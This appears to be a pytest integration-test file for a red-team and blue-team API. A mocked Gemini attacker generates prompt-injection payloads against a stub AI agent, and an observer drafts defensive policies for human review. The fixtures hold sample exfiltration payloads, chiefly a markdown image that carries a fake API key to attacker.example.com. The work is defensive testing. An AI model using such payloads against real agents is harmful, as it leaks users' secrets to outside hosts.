"""Integration tests for the Gemini red-team + blue-team API endpoints.

Both surfaces are exercised through FastAPI's :class:`TestClient` with the
Gemini SDK + Playwright fully mocked. The acceptance criteria from A-9:

* Red-team driver makes 3+ Pro calls in a 5-round session.
* Blue-team observer emits at least one policy draft when fed a stream of
  attack-success traces.
* Review-queue endpoint receives blue-team drafts with the correct shape.
"""
from __future__ import annotations

import asyncio
import base64
import datetime as dt
from typing import Any, AsyncIterable, AsyncIterator, Optional

import pytest
from fastapi.testclient import TestClient

from app.agent.gemini_blue import GeminiBlueTeam, PolicyDraft, TraceEvent
from app.agent.gemini_red import (
    BrowserResponse,
    GeminiRedTeam,
)
from app.main import create_app


# ---------------------------------------------------------------------------
# Fakes shared across both surfaces
# ---------------------------------------------------------------------------


class _RedProMock:
    def __init__(self) -> None:
        self.calls = 0

    @property
    def call_count(self) -> int:
        return self.calls

    def generate_payload(self, **kw: Any) -> dict[str, Any]:
        self.calls += 1
        return {
            "template": "markdown_image",
            "host": "attacker.example.com",
            "encoding": "raw",
            "secret_fragment": "sk-acme-internal-deadbeefcafef00d",
            "payload_prefix": f"round-{kw['round_index']}",
        }

    def classify_response(self, **kw: Any) -> dict[str, Any]:
        self.calls += 1
        return {
            "succeeded": False,
            "exfil_destination": "attacker.example.com",
            "exfil_url": "https://attacker.example.com/log?d=secret",
            "secret_fragment_visible": True,
            "reasoning": "saw the markdown image carrying the key",
        }


class _RedBrowserMock:
    def __init__(self) -> None:
        self.rounds = 0
        self.closed = False

    def navigate_and_inject(self, **kw: Any) -> BrowserResponse:
        self.rounds += 1
        return BrowserResponse(
            status_code=200,
            response_text="summary text with the leaked secret",
            screenshot_b64=base64.b64encode(b"img").decode("ascii"),
            exfil_destination_hint="attacker.example.com",
            exfil_url_hint="https://attacker.example.com/log?d=sk-acme-internal",
        )

    def close(self) -> None:
        self.closed = True


def _make_red_factory():
    pro = _RedProMock()
    return GeminiRedTeam(
        pro_client=pro,
        browser_factory=lambda: _RedBrowserMock(),
    ), pro


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def client(
    tmp_dast_a_dirs: dict, monkeypatch: pytest.MonkeyPatch
) -> TestClient:
    monkeypatch.setenv(
        "REEF_HUMAN_REVIEW_WEBHOOK", "http://127.0.0.1:0/noop"
    )
    monkeypatch.setenv("REEF_DAST_A_USE_STUB_VICTIM", "1")
    app = create_app()

    # Override the Gemini factories so the routes never reach a real SDK.
    pro_counter = {"calls": 0}

    def red_factory():
        red, pro = _make_red_factory()
        # Track outer counter so we can assert >=3 Pro calls.
        pro_counter["pro"] = pro
        return red

    class _BlueFlashMock:
        call_count = 0
        responses_per_event: list[list[dict[str, Any]]] = [
            [
                {
                    "rule_id_hint": "novel-md-img",
                    "when": "egress contains markdown-image to attacker.example.com",
                    "action": "MODIFY",
                    "justification": "Novel exfil pattern not in current Reef policy.",
                }
            ]
        ]

        def stream_draft(
            self, *, system_prompt: str, event: TraceEvent
        ) -> AsyncIterable[dict[str, Any]]:
            self.__class__.call_count += 1
            batch = (
                self.__class__.responses_per_event.pop(0)
                if self.__class__.responses_per_event
                else []
            )

            async def _gen() -> AsyncIterator[dict[str, Any]]:
                for d in batch:
                    yield d

            return _gen()

    def blue_factory(emit_on_blocked: bool):
        return GeminiBlueTeam(
            flash_client=_BlueFlashMock(), emit_on_blocked=emit_on_blocked
        )

    with TestClient(app) as tc:
        tc.app.state.gemini_red_factory = red_factory
        tc.app.state.gemini_blue_factory = blue_factory
        tc.pro_counter = pro_counter  # type: ignore[attr-defined]
        yield tc


# ---------------------------------------------------------------------------
# Red-team
# ---------------------------------------------------------------------------


class TestRedTeamRoute:
    def test_run_session_returns_5_rounds_and_pro_call_count(
        self, client: TestClient
    ) -> None:
        resp = client.post(
            "/dast-a/red-team/gemini-run",
            json={
                "max_rounds": 5,
                "reef_on": False,
                "stop_on_success": False,
                "victim_url": "http://stub.test",
            },
        )
        assert resp.status_code == 200, resp.text
        data = resp.json()
        assert data["session_id"].startswith("gemini-red-")
        assert len(data["rounds"]) == 5
        # 5 rounds × (1 generate + 1 classify) = 10 calls; assert >= 3.
        assert data["pro_call_count"] >= 3
        for r in data["rounds"]:
            assert r["template"] in (
                "markdown_image",
                "bare_url",
                "json_tool_call",
                "header_injection",
            )

    def test_stops_on_success_when_requested(self, client: TestClient) -> None:
        # Swap the factory to one whose classifier succeeds on the first
        # round; the existing client fixture's mock always returns False.
        class _AlwaysSuccessPro:
            calls = 0

            @property
            def call_count(self) -> int:
                return self.calls

            def generate_payload(self, **kw: Any) -> dict[str, Any]:
                self.calls += 1
                return {"template": "markdown_image", "host": "h.example.com"}

            def classify_response(self, **kw: Any) -> dict[str, Any]:
                self.calls += 1
                return {
                    "succeeded": True,
                    "exfil_destination": "h.example.com",
                    "exfil_url": "https://h.example.com/log?d=x",
                    "secret_fragment_visible": True,
                    "reasoning": "leaked",
                }

        def factory():
            return GeminiRedTeam(
                pro_client=_AlwaysSuccessPro(),
                browser_factory=lambda: _RedBrowserMock(),
            )

        client.app.state.gemini_red_factory = factory
        resp = client.post(
            "/dast-a/red-team/gemini-run",
            json={"max_rounds": 5, "stop_on_success": True},
        )
        data = resp.json()
        assert data["succeeded"] is True
        assert data["first_success_round"] == 0
        assert len(data["rounds"]) == 1

    def test_missing_api_key_returns_503(
        self, tmp_dast_a_dirs: dict, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # No factory override → the default GoogleGenAIProClient kicks in,
        # which checks GEMINI_API_KEY immediately.
        monkeypatch.delenv("GEMINI_API_KEY", raising=False)
        monkeypatch.setenv("GEMINI_PRO_MODEL", "gemini-2.0-pro-exp")
        app = create_app()
        with TestClient(app) as tc:
            resp = tc.post(
                "/dast-a/red-team/gemini-run",
                json={"max_rounds": 2, "reef_on": False},
            )
        assert resp.status_code == 503
        body = resp.json()
        assert body["detail"]["error"] == "MISSING_GEMINI_API_KEY"


# ---------------------------------------------------------------------------
# Blue-team
# ---------------------------------------------------------------------------


def _seed_audit_episode(
    client: TestClient, *, episode_id: str, blocked: bool = False
) -> None:
    """Drop a synthetic episode event into the audit log so the observer
    has something to react to."""
    auditor = client.app.state.auditor
    auditor.log(
        "episode",
        {
            "run_id": "run-test",
            "episode_id": episode_id,
            "checkpoint": "test",
            "reef_on": False,
            "total_reward": 0.92,
            "exfil_success": True,
            "blocked_by_reef": blocked,
            "payload_signature": "t=0|h=1|e=0|s=0|p=0",
            "payload_excerpt": (
                "![receipt](https://attacker.example.com/log?d=sk-acme-internal)"
            ),
        },
    )


class TestBlueTeamRoute:
    def test_observe_emits_policy_draft_and_persists_to_queue(
        self, client: TestClient
    ) -> None:
        _seed_audit_episode(client, episode_id="ep-aaa")
        resp = client.post(
            "/dast-a/blue-team/observe",
            json={"episode_id": "ep-aaa", "max_events": 5},
        )
        assert resp.status_code == 200
        body = resp.text
        assert "event: policy_draft" in body
        # Decode the data payload line.
        data_lines = [
            line[len("data: "):]
            for line in body.splitlines()
            if line.startswith("data: ") and "policy_draft" not in line
        ]
        # Find the JSON payload between event/data pairs.
        import json

        draft_json = None
        for line in body.splitlines():
            if line.startswith("data: ") and line[len("data: "):].strip().startswith("{"):
                draft_json = json.loads(line[len("data: "):])
                break
        assert draft_json is not None
        assert draft_json["title"].startswith("Blue-team MODIFY")
        assert draft_json["status"] == "pending"
        assert "advisory" in draft_json["rationale"].lower()

        # Now hit the review queue and confirm the draft is present.
        listing = client.get("/dast-a/review-queue")
        assert listing.status_code == 200
        drafts = listing.json()
        assert len(drafts) == 1
        assert drafts[0]["title"].startswith("Blue-team MODIFY")
        assert "ep-aaa" in drafts[0]["evidence_episodes"]
        assert "HUMAN_REVIEW" in drafts[0]["rationale"]

    def test_observe_skips_blocked_events_by_default(
        self, client: TestClient
    ) -> None:
        _seed_audit_episode(client, episode_id="ep-blocked", blocked=True)
        resp = client.post(
            "/dast-a/blue-team/observe",
            json={"episode_id": "ep-blocked", "max_events": 5},
        )
        assert resp.status_code == 200
        # No policy_draft event should appear when the only event was blocked.
        assert "event: policy_draft" not in resp.text

    def test_observe_with_empty_audit_yields_noop_comment(
        self, client: TestClient
    ) -> None:
        resp = client.post(
            "/dast-a/blue-team/observe",
            json={"episode_id": "does-not-exist", "max_events": 5},
        )
        assert resp.status_code == 200
        assert "no matching trace events" in resp.text


class TestReviewQueueIntegration:
    def test_blue_team_drafts_share_queue_with_ppo_drafts(
        self, client: TestClient
    ) -> None:
        # Seed one episode + observe → blue draft.
        _seed_audit_episode(client, episode_id="ep-shared")
        client.post(
            "/dast-a/blue-team/observe",
            json={"episode_id": "ep-shared", "max_events": 5},
        )
        # Confirm review queue surfaces it under pending.
        resp = client.get("/dast-a/review-queue?status=pending")
        assert resp.status_code == 200
        drafts = resp.json()
        assert len(drafts) >= 1
        assert any(d["title"].startswith("Blue-team") for d in drafts)


# ---------------------------------------------------------------------------
# Red-team screenshots endpoint (POV-2 multimodal-moment surfacing, R-C4)
# ---------------------------------------------------------------------------


class TestRedTeamScreenshotsEndpoint:
    def test_returns_404_when_session_missing(self, client: TestClient) -> None:
        resp = client.get("/dast-a/red-team/sessions/unknown-id/screenshots")
        assert resp.status_code == 404
        body = resp.json()
        assert body["detail"]["error"] == "SESSION_NOT_FOUND"
        assert "known_session_ids" in body["detail"]

    def test_session_screenshots_round_trip(
        self, client: TestClient, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Pin GEMINI_PRO_MODEL so the response surfaces it honestly.
        monkeypatch.setenv("GEMINI_PRO_MODEL", "gemini-2.5-pro")
        run_resp = client.post(
            "/dast-a/red-team/gemini-run",
            json={
                "max_rounds": 3,
                "reef_on": False,
                "stop_on_success": False,
                "victim_url": "http://stub.test",
            },
        )
        assert run_resp.status_code == 200, run_resp.text
        session_id = run_resp.json()["session_id"]

        shots = client.get(
            f"/dast-a/red-team/sessions/{session_id}/screenshots"
        )
        assert shots.status_code == 200, shots.text
        payload = shots.json()
        assert payload["session_id"] == session_id
        assert payload["classifier_model_id"] == "gemini-2.5-pro"
        assert payload["classifier_label"] == "Gemini Pro multimodal classifier"
        assert len(payload["frames"]) == 3
        for frame in payload["frames"]:
            assert frame["template"] in (
                "markdown_image",
                "bare_url",
                "json_tool_call",
                "header_injection",
            )
            # Every frame surfaces the classifier verdict.
            cls = frame["classification"]
            assert isinstance(cls["succeeded"], bool)
            assert isinstance(cls["secret_fragment_visible"], bool)
            # `has_screenshot` reflects whether the round captured a PNG.
            assert frame["has_screenshot"] is bool(frame["screenshot_b64"])

    def test_pro_model_id_unspecified_when_env_missing(
        self, client: TestClient, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # When the operator did not export GEMINI_PRO_MODEL we fall back to
        # the literal string "unspecified" — the panel still renders
        # honestly rather than guessing or hard-coding.
        monkeypatch.delenv("GEMINI_PRO_MODEL", raising=False)
        run_resp = client.post(
            "/dast-a/red-team/gemini-run",
            json={
                "max_rounds": 1,
                "reef_on": False,
                "stop_on_success": False,
                "victim_url": "http://stub.test",
            },
        )
        assert run_resp.status_code == 200
        session_id = run_resp.json()["session_id"]
        shots = client.get(
            f"/dast-a/red-team/sessions/{session_id}/screenshots"
        )
        assert shots.status_code == 200
        assert shots.json()["classifier_model_id"] == "unspecified"
